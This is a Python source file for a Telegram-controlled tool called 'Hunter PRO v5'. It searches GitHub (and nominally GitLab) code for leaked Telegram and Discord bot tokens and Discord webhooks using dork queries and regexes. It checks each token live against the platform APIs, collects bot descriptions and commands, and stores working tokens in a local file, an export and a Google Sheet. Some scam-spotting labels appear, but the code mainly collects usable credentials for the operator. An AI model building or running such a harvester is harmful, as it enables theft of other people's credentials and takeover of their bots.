import os
import re
import time
import json
import random
import io
import base64
import threading
import concurrent.futures
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from collections import Counter

import requests
import telebot
from telebot import types
from flask import Flask, jsonify, render_template_string

# Для графиков
import matplotlib
matplotlib.use('Agg')
import matplotlib.pyplot as plt

# Для Google Sheets
import gspread
from google.oauth2.service_account import Credentials

# =====================================================================
# ⬇️ НАСТРОЙКИ (Environment Variables) ⬇️
# =====================================================================
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", "")
GITLAB_TOKEN = os.getenv("GITLAB_TOKEN", "")
CONTROL_BOT_TOKEN = os.getenv("CONTROL_BOT_TOKEN", "")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

# Google Sheets
GOOGLE_CREDS_B64 = os.getenv("GOOGLE_CREDS_B64", "")
SPREADSHEET_ID = os.getenv("SPREADSHEET_ID", "")
# =====================================================================

bot = telebot.TeleBot(CONTROL_BOT_TOKEN)
app = Flask(__name__)

# Регулярки
TG_TOKEN_RE = re.compile(r"\b\d{8,10}:AA[A-Za-z0-9_-]{32}\b|\b\d{8,10}:[A-Za-z0-9_-]{35}\b")
DISCORD_TOKEN_RE = re.compile(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}")
DISCORD_WEBHOOK_RE = re.compile(r"https://discord\.com/api/webhooks/\d+/[a-zA-Z0-9_-]+")

SEEN_DB_FILE = "seen_tokens.txt"
LIVE_DB_FILE = "live_tokens.json"

search_state = {
    "is_searching": False,
    "stop_requested": False,
    "limit_live": 5,
    "found_live_current": 0,
    "checked_tokens": 0,
    "dead_tokens": 0,
    "scam_tokens": 0,
    "start_time": None,
    "current_query": "",
    "status_text": "Ожидание...",
    "logs": [],
    "phrase": "Готов к работе"
}

BASE_DORKS = ['BOT_TOKEN', 'TELEGRAM_BOT_TOKEN', 'bot_token', 'api.telegram.org', 'DISCORD_TOKEN']
HACKER_PHRASES = [
    "Сканирую GitHub и GitLab...", "Обхожу лимиты API...", "Ищу уязвимости...",
    "Анализирую байты...", "Дешифрую репозитории...", "Проверяю узлы сети...",
    "Собираю фрагменты кода...", "Ищу следы скамеров..."
]
SPINNERS = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]

db_lock = threading.Lock()

# ===================== GOOGLE SHEETS =====================
def save_to_google_sheets(data: Dict):
    if not GOOGLE_CREDS_B64 or not SPREADSHEET_ID:
        return
    try:
        creds_json = json.loads(base64.b64decode(GOOGLE_CREDS_B64).decode('utf-8'))
        scopes = ['https://www.googleapis.com/auth/spreadsheets', 'https://www.googleapis.com/auth/drive']
        creds = Credentials.from_service_account_info(creds_json, scopes=scopes)
        client = gspread.authorize(creds)
        
        sheet = client.open_by_key(SPREADSHEET_ID).sheet1
        # Формат: Время | Платформа | Имя | Токен | Ссылка | Скам?
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        sheet.append_row([timestamp, data['type'], data['bot'], data['token'], data['url'], str(data['scam'])])
        add_log("☁️ Записано в Google Таблицу!")
    except Exception as e:
        add_log(f"❌ Ошибка Sheets: {str(e)[:20]}")

# ===================== БАЗА ДАННЫХ =====================
def load_seen_tokens() -> set:
    with db_lock:
        if os.path.exists(SEEN_DB_FILE):
            with open(SEEN_DB_FILE, "r", encoding="utf-8") as f:
                return set(line.strip() for line in f if line.strip())
        return set()

def append_seen_token(token: str):
    with db_lock:
        with open(SEEN_DB_FILE, "a", encoding="utf-8") as f:
            f.write(f"{token}\n")

def save_live_token(token_data: Dict):
    with db_lock:
        live_list = []
        if os.path.exists(LIVE_DB_FILE):
            with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                live_list = json.load(f)
        if not any(item["token"] == token_data["token"] for item in live_list):
            live_list.append(token_data)
            with open(LIVE_DB_FILE, "w", encoding="utf-8") as f:
                json.dump(live_list, f, ensure_ascii=False, indent=4)
    
    # Дублируем в гугл таблицу
    threading.Thread(target=save_to_google_sheets, args=(token_data,), daemon=True).start()

def load_live_tokens() -> List[Dict]:
    with db_lock:
        if os.path.exists(LIVE_DB_FILE):
            with open(LIVE_DB_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        return []

# ===================== ЛОГИ =====================
def add_log(text: str):
    time_str = datetime.now().strftime("%H:%M:%S")
    log_entry = f"[{time_str}] {text}"
    search_state["logs"].append(log_entry)
    # Теперь храним 15 строк логов для красоты
    if len(search_state["logs"]) > 15:
        search_state["logs"].pop(0)

# ===================== ДОСЬЕ И ПРОВЕРКИ =====================
def get_bot_dossier(token: str) -> str:
    """Получает описание и команды бота"""
    try:
        desc_url = f"https://api.telegram.org/bot{token}/getMyDescription"
        desc = requests.get(desc_url, timeout=5).json().get("result", {}).get("description", "Нет описания")
        
        cmd_url = f"https://api.telegram.org/bot{token}/getMyCommands"
        cmds_data = requests.get(cmd_url, timeout=5).json().get("result", [])
        cmds = ", ".join([f"/{c['command']}" for c in cmds_data]) if cmds_data else "Нет команд"
        
        return f"📝 <b>Био:</b> {desc}\n📜 <b>Команды:</b> {cmds}"
    except Exception:
        return "Не удалось загрузить досье."

def check_telegram_token(token: str) -> Tuple[bool, Optional[str], bool, str]:
    url = f"https://api.telegram.org/bot{token}/getMe"
    try:
        r = requests.get(url, timeout=5)
        data = r.json()
        if data.get("ok"):
            username = data["result"].get("username", "")
            first_name = data["result"].get("first_name", "").lower()
            username_lower = username.lower()
            scam_keywords = ["support", "security", "crypto", "giveaway", "bonus", "airdrop", "check", "verify", "official", "help", "проверка"]
            is_suspicious = any(word in first_name or word in username_lower for word in scam_keywords)
            dossier = get_bot_dossier(token)
            return True, username, is_suspicious, dossier
    except Exception:
        pass
    return False, None, False, ""

def check_discord_token(token: str) -> Tuple[bool, Optional[str], bool, str]:
    url = "https://discord.com/api/v10/users/@me"
    headers = {"Authorization": f"Bot {token}"}
    try:
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return True, data.get("username", ""), False, "Discord Bot"
    except Exception:
        pass
    return False, None, False, ""

def check_discord_webhook(url: str) -> Tuple[bool, Optional[str]]:
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return True, data.get("name", "Unknown")
    except Exception:
        pass
    return False, None

# ===================== ГРАФИКИ =====================
def generate_stats_chart() -> io.BytesIO:
    labels = ['Живые', 'Мертвые', 'Скам']
    sizes = [search_state["found_live_current"], search_state["dead_tokens"], search_state["scam_tokens"]]
    colors = ['#00ff00', '#ff0000', '#ffaa00']
    
    if sum(sizes) == 0:
        sizes = [1]
        labels = ['Нет данных']
        colors = ['#333333']

    fig, ax = plt.subplots(figsize=(6, 4), facecolor='#1e1e1e')
    ax.set_facecolor('#1e1e1e')
    
    ax.pie(
        sizes, labels=labels, colors=colors, autopct='%1.1f%%',
        textprops={'color': 'white', 'fontweight': 'bold'}, startangle=140
    )
    ax.set_title('Статистика Охоты', color='#00ff00', fontweight='bold')
    
    buf = io.BytesIO()
    plt.savefig(buf, format='png', facecolor='#1e1e1e')
    buf.seek(0)
    plt.close(fig)
    return buf

# ===================== FLASK ВЕБ-ДАШБОРД =====================
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Hunter PRO v5</title>
    <meta charset="utf-8">
    <style>
        body { background-color: #0d1117; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
        h1 { text-align: center; text-shadow: 0 0 10px #00ff00; }
        .stats { border: 1px solid #00ff00; padding: 15px; margin-bottom: 20px; box-shadow: 0 0 10px #00ff00; }
        .log { color: #aaaaaa; font-size: 0.9em; margin-top: 10px; line-height: 1.2; }
    </style>
    <script>
        function updateData() {
            fetch('/api/stats')
            .then(response => response.json())
            .then(data => {
                document.getElementById('time').innerText = data.time;
                document.getElementById('checked').innerText = data.checked;
                document.getElementById('found').innerText = data.found;
                document.getElementById('query').innerText = data.query;
                document.getElementById('status').innerText = data.status;
                
                let logDiv = document.getElementById('logs');
                logDiv.innerHTML = '';
                data.logs.forEach(l => { logDiv.innerHTML += `<div>> ${l}</div>`; });
            });
        }
        setInterval(updateData, 1000);
    </script>
</head>
<body>
    <h1>[ HUNTER DASHBOARD v5 ]</h1>
    <div class="stats">
        <p>⏱ Время: <span id="time">00:00:00</span> | 🔍 Проверено: <span id="checked">0</span> | 🟢 Живых: <span id="found">0</span></p>
        <p>📡 Запрос: <span id="query">...</span></p>
        <p>⚠️ Статус: <span id="status">...</span></p>
        <div class="log" id="logs"></div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/health')
def health():
    return "OK", 200

@app.route('/api/stats')
def api_stats():
    elapsed = int(time.time() - search_state["start_time"]) if search_state["start_time"] else 0
    return jsonify({
        "time": format_time(elapsed),
        "checked": search_state["checked_tokens"],
        "found": search_state["found_live_current"],
        "query": search_state["current_query"],
        "status": search_state["status_text"],
        "logs": search_state["logs"]
    })

# ===================== ПОИСК =====================
def search_github_dynamic() -> Tuple[List[Dict], int]:
    findings = []
    seen_tokens = load_seen_tokens()
    base = random.choice(BASE_DORKS)
    lang = random.choice(["python", "javascript", "php", "go", "json", ""])
    lang_part = f" language:{lang}" if lang else ""
    
    query = f"{base} in:file{lang_part}"
    search_state["current_query"] = f"GitHub: {query}"
    
    headers = {"Accept": "application/vnd.github.text-match+json", "Authorization": f"token {GITHUB_TOKEN}"}
    params = {"q": query, "per_page": 100, "page": random.randint(1, 3), "sort": "indexed", "order": "desc"}

    try:
        resp = requests.get("https://api.github.com/search/code", headers=headers, params=params, timeout=15)
        if resp.status_code == 403:
            search_state["status_text"] = "⚠️ Лимит GitHub. Отдых 60с"
            time.sleep(60)
            return [], 403
        if resp.status_code == 401:
            search_state["status_text"] = "❌ Ошибка GitHub Token!"
            search_state["stop_requested"] = True
            return [], 401

        resp.raise_for_status()
        for item in resp.json().get("items", []):
            for match in item.get("text_matches", []):
                fragment = match.get("fragment", "")
                for t in TG_TOKEN_RE.findall(fragment):
                    if t not in seen_tokens:
                        findings.append({"type": "Telegram", "token": t, "repo": item["repository"]["full_name"], "url": item["html_url"]})
                        append_seen_token(t)
                for t in DISCORD_TOKEN_RE.findall(fragment):
                    if t not in seen_tokens:
                        findings.append({"type": "Discord", "token": t, "repo": item["repository"]["full_name"], "url": item["html_url"]})
                        append_seen_token(t)
                for w in DISCORD_WEBHOOK_RE.findall(fragment):
                    if w not in seen_tokens:
                        findings.append({"type": "Webhook", "token": w, "repo": item["repository"]["full_name"], "url": item["html_url"]})
                        append_seen_token(w)
        time.sleep(10)
        return findings, 200
    except Exception:
        time.sleep(10)
        return [], 500

def search_gitlab() -> List[Dict]:
    """Простой поиск по GitLab (только если есть токен)"""
    if not GITLAB_TOKEN: return []
    findings = []
    seen_tokens = load_seen_tokens()
    query = random.choice(["BOT_TOKEN", "api.telegram.org"])
    search_state["current_query"] = f"GitLab: {query}"
    
    try:
        url = f"https://gitlab.com/api/v4/search?scope=blobs&search={query}"
        headers = {"PRIVATE-TOKEN": GITLAB_TOKEN}
        resp = requests.get(url, headers=headers, timeout=15)
        
        if resp.status_code == 200:
            for item in resp.json()[:10]: # Берем первые 10
                # В GitLab нужно запрашивать raw-файл отдельно, но для экономии времени
                # мы просто проверяем данные, если они есть в ответе (обычно пусто)
                pass
    except Exception:
        pass
    return findings

# ===================== БОТ: ИНТЕРФЕЙС =====================
def get_main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add('🚀 Начать поиск', '🛑 Остановить', '⚙️ Настройки', '🗂 База и Фильтры')
    return markup

def get_progress_buttons():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 График", callback_data="show_chart"),
        types.InlineKeyboardButton("🗂 Топ-5", callback_data="show_top5"),
        types.InlineKeyboardButton("🔄 Обновить", callback_data="force_update"),
        types.InlineKeyboardButton("🛑 Стоп", callback_data="stop_search_btn")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.chat.id != ADMIN_ID: return
    bot.send_message(message.chat.id, "👋 <b>Пульт Hunter PRO v5</b>\nТеперь с Google Sheets, Досье и Webhooks!", reply_markup=get_main_menu(), parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '⚙️ Настройки')
def show_settings(message):
    if message.chat.id != ADMIN_ID: return
    markup = types.InlineKeyboardMarkup(row_width=3)
    markup.add(
        types.InlineKeyboardButton("1", callback_data="limit_1"),
        types.InlineKeyboardButton("5", callback_data="limit_5"),
        types.InlineKeyboardButton("10", callback_data="limit_10"),
        types.InlineKeyboardButton("∞", callback_data="limit_999")
    )
    bot.send_message(message.chat.id, f"⚙️ <b>Текущий лимит:</b> {search_state['limit_live']}", reply_markup=markup, parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data.startswith('limit_'))
def callback_settings(call):
    limit = int(call.data.split('_')[1])
    search_state["limit_live"] = limit
    bot.answer_callback_query(call.id, "Лимит обновлен!")
    bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"✅ <b>Лимит:</b> {limit if limit != 999 else 'Без лимита'}", parse_mode='HTML')

@bot.message_handler(func=lambda message: message.text == '🛑 Остановить')
def stop_command(message):
    if message.chat.id != ADMIN_ID: return
    search_state["stop_requested"] = True
    bot.send_message(message.chat.id, "⏹️ Команда остановки принята.")

# --- ФИЛЬТРАЦИЯ БАЗЫ ---
@bot.message_handler(func=lambda message: message.text == '🗂 База и Фильтры')
def show_db_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("Все", callback_data="db_all"),
        types.InlineKeyboardButton("Telegram", callback_data="db_tg"),
        types.InlineKeyboardButton("Discord", callback_data="db_dc"),
        types.InlineKeyboardButton("Только Скам", callback_data="db_scam"),
        types.InlineKeyboardButton("📥 Экспорт в файл", callback_data="export_file")
    )
    bot.send_message(message.chat.id, "Выбери фильтр:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('db_'))
def cb_show_db(call):
    live_tokens = load_live_tokens()
    if not live_tokens:
        bot.answer_callback_query(call.id, "База пуста!")
        return
    
    filter_type = call.data.split('_')[1]
    filtered = []
    
    for t in live_tokens:
        if filter_type == "all": filtered.append(t)
        elif filter_type == "tg" and t.get("type") == "Telegram": filtered.append(t)
        elif filter_type == "dc" and t.get("type") == "Discord": filtered.append(t)
        elif filter_type == "scam" and t.get("scam"): filtered.append(t)
        elif filter_type == "scam" and t.get("type") == "Webhook": filtered.append(t) # Вебхуки тоже в скам
        
    if not filtered:
        bot.answer_callback_query(call.id, "По этому фильтру пусто.")
        return
        
    text = f"🗂 <b>База ({filter_type}):</b>\n\n"
    for i, t in enumerate(filtered[-15:], 1):
        scam = "⚠️" if t.get("scam") else "✅"
        platform = t.get("type", "TG")[:2].upper()
        text += f"{scam} [{platform}] <code>{t['token']}</code>\n"
    
    bot.send_message(call.message.chat.id, text, parse_mode='HTML', disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data == 'export_file')
def export_live_db(call):
    live_tokens = load_live_tokens()
    filename = f"live_tokens_{datetime.now().strftime('%m-%d_%H-%M')}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        for t in live_tokens:
            f.write(f"[{t.get('type', 'TG')}] @{t['bot']} | {t['token']} | {t['url']}\n")
    with open(filename, "rb") as f:
        bot.send_document(call.message.chat.id, f)

# --- КНОПКИ В ПРОГРЕСС-БАРЕ ---
@bot.callback_query_handler(func=lambda call: call.data == 'show_chart')
def cb_show_chart(call):
    bot.answer_callback_query(call.id, "Рисую...")
    buf = generate_stats_chart()
    bot.send_photo(call.message.chat.id, buf, caption="📊 Статистика")

@bot.callback_query_handler(func=lambda call: call.data == 'show_top5')
def cb_show_top5(call):
    bot.answer_callback_query(call.id, "Собираю...")
    live_tokens = load_live_tokens()
    if not live_tokens: return
    owners = [t["repo"].split("/")[0] for t in live_tokens if "repo" in t]
    top = Counter(owners).most_common(5)
    text = "🏆 <b>Топ-5:</b>\n\n"
    for i, (o, c) in enumerate(top, 1):
        text += f"{i}. <a href='https://github.com/{o}'>{o}</a> — {c}\n"
    bot.send_message(call.message.chat.id, text, parse_mode='HTML', disable_web_page_preview=True)

@bot.callback_query_handler(func=lambda call: call.data == 'stop_search_btn')
def cb_stop_search(call):
    search_state["stop_requested"] = True
    bot.answer_callback_query(call.id, "Остановка...")

@bot.callback_query_handler(func=lambda call: call.data == 'force_update')
def cb_force_update(call):
    bot.answer_callback_query(call.id, "OK")
    update_progress_message(call.message.chat.id, call.message.message_id)

# --- СТАРТ ПОИСКА ---
@bot.message_handler(func=lambda message: message.text == '🚀 Начать поиск')
def start_search_command(message):
    if search_state["is_searching"]:
        bot.send_message(message.chat.id, "⚠️ Уже ищу!")
        return
    
    search_state.update({
        "is_searching": True, "stop_requested": False, "found_live_current": 0,
        "checked_tokens": 0, "dead_tokens": 0, "scam_tokens": 0,
        "start_time": time.time(), "status_text": "Запуск...", "logs": []
    })
    
    msg = bot.send_message(message.chat.id, "⏳ <b>Инициализация...</b>", parse_mode='HTML')
    threading.Thread(target=live_ui_updater, args=(message.chat.id, msg.message_id), daemon=True).start()
    threading.Thread(target=run_search_task, args=(message.chat.id, msg.message_id)).start()

def live_ui_updater(chat_id, msg_id):
    spinner_idx = 0
    while search_state["is_searching"] and not search_state["stop_requested"]:
        search_state["phrase"] = random.choice(HACKER_PHRASES)
        update_progress_message(chat_id, msg_id, spinner_idx)
        spinner_idx += 1
        time.sleep(3)

def update_progress_message(chat_id, msg_id, spinner_idx=0):
    elapsed = int(time.time() - search_state["start_time"]) if search_state["start_time"] else 0
    spinner = SPINNERS[spinner_idx % len(SPINNERS)]
    
    logs_text = "\n".join(search_state["logs"]) if search_state["logs"] else "> Ожидание..."

    text = (
        f"{spinner} <b>Кибер-поиск (v5)...</b>\n\n"
        f"⏱ Время: <code>{format_time(elapsed)}</code> | 🔍 Проверено: <code>{search_state['checked_tokens']}</code>\n"
        f"🟢 Живых: <code>{search_state['found_live_current']} / {search_state['limit_live']}</code>\n\n"
        f"📡 Запрос: <code>{search_state['current_query']}</code>\n\n"
        f"📟 <b>Консоль событий (15 строк):</b>\n<pre>{logs_text}</pre>\n"
        f"⚙️ <i>{search_state['phrase']}</i>"
    )
    
    try:
        bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=text, parse_mode='HTML', reply_markup=get_progress_buttons())
    except Exception:
        pass

def run_search_task(chat_id, msg_id):
    try:
        while not search_state["stop_requested"]:
            if search_state["found_live_current"] >= search_state["limit_live"]:
                search_state["status_text"] = "🏁 Лимит."
                break

            raw_findings, code = search_github_dynamic()
            if code == 401: break
            
            # Периодически дергаем GitLab
            if random.random() < 0.3:
                raw_findings.extend(search_gitlab())
                
            if not raw_findings: continue

            for f in raw_findings:
                if search_state["stop_requested"] or search_state["found_live_current"] >= search_state["limit_live"]:
                    break
                
                add_log(f"🔍 {f['type']} в {f['repo'][:12]}...")

                if f["type"] == "Telegram":
                    is_live, bot_username, is_scam, dossier = check_telegram_token(f["token"])
                elif f["type"] == "Discord":
                    is_live, bot_username, is_scam, dossier = check_discord_token(f["token"])
                elif f["type"] == "Webhook":
                    is_live, bot_username = check_discord_webhook(f["token"])
                    is_scam, dossier = True, "Discord Webhook для кражи данных"
                else:
                    continue

                search_state["checked_tokens"] += 1
                
                if is_live:
                    search_state["found_live_current"] += 1
                    if is_scam: search_state["scam_tokens"] += 1
                    
                    token_info = {
                        "type": f["type"], "token": f["token"], "repo": f["repo"], "url": f["url"],
                        "bot": bot_username, "scam": is_scam
                    }
                    save_live_token(token_info)
                    add_log(f"🟢 БИНГО! {f['type']} @{bot_username}")
                    
                    platform_tag = f["type"]
                    scam_tag = "⚠️ СКАМ" if is_scam else "✅ НОРМ"
                    
                    msg = (
                        f"🚨 <b>НАЙДЕН {platform_tag}!</b> ({search_state['found_live_current']}/{search_state['limit_live']})\n\n"
                        f"🤖 Имя: <b>{bot_username}</b>\n"
                        f"🏷 Статус: {scam_tag}\n"
                        f"🔗 <a href='{f['url']}'>Репозиторий</a>\n"
                        f"🔑 Токен: <code>{f['token']}</code>\n\n"
                        f"📄 <b>Досье:</b>\n{dossier}"
                    )
                    try:
                        bot.send_message(chat_id, msg, parse_mode='HTML', disable_web_page_preview=True)
                    except:
                        pass
                else:
                    search_state["dead_tokens"] += 1
                    add_log(f"❌ Мертвый {f['type']}")

    finally:
        search_state["is_searching"] = False
        elapsed = int(time.time() - search_state["start_time"])
        final_text = f"🏁 <b>Поиск завершен.</b>\n⏱ Время: {format_time(elapsed)}\n🟢 Найдено: {search_state['found_live_current']}"
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=final_text, parse_mode='HTML', reply_markup=None)
        except: pass

def format_time(seconds):
    m, s = divmod(seconds, 60)
    h, m = divmod(m, 60)
    return f"{h:02d}:{m:02d}:{s:02d}"

# ===================== ЗАПУСК =====================
def run_bot():
    bot.infinity_polling()

if __name__ == "__main__":
    threading.Thread(target=run_bot, daemon=True).start()
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
